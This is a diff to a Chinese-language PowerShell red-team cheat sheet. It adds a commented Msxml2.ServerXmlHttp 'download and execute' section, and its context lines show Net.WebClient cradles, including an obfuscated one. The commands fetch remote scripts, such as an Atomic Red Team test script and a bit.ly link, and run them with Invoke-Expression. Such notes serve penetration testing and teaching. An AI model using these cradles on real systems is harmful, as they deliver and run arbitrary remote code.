@@ -31,6 +31,8 @@
     - [获取凭证](#获取凭证)
       - [Mimikatz](#mimikatz)
   - [下载与执行文件](#下载与执行文件)
+    - [Net.WebClient](#netwebclient)
+    - [Msxml2.ServerXmlHttp](#msxml2serverxmlhttp)
   - [域渗透](#域渗透)
     - [域内提权-42278/42287](#域内提权-4227842287)
 
@@ -804,6 +806,8 @@ powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githu
 
 ## 下载与执行文件
 
+### Net.WebClient
+
 ```powershell
 (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
 
@@ -982,6 +986,22 @@ Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set
       - `iex` 是 `Invoke-Expression` 的别名, 用于执行字符串中的命令
       - `&` 是 `Invoke-Command` 的别名, 用于执行命令
       - 整个命令的作用是执行 `Default_File_Path.ps1` 中的命令
+---
+
+### Msxml2.ServerXmlHttp
+
+```powershell
+# 新建一个 COM 对象, 它是 Msxml2.ServerXmlHttp 类的一个实例, 用于发送 HTTP 请求和接受响应
+$comMsXml = New-Object -ComObject MsXml2.ServerXmlHttp; 
+# 使用 COM 对象的 Open 方法打开一个 HTTP GET 请求; $False 表示同步请求(非异步)
+$comMsXml.Open('GET', 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1', $False); 
+# 使用 COM 对象的 Send 方法发送 HTTP 请求并等待响应, 响应会被保存在 COM 对象的 ResponseText 属性中
+$comMsXml.Send(); 
+Write-Host $comMsXml.ResponseText
+# Invoke-Expression 执行响应(中的脚本)
+IEX $comMsXml.ResponseText
+```
+
 ---
 
 ## 域渗透
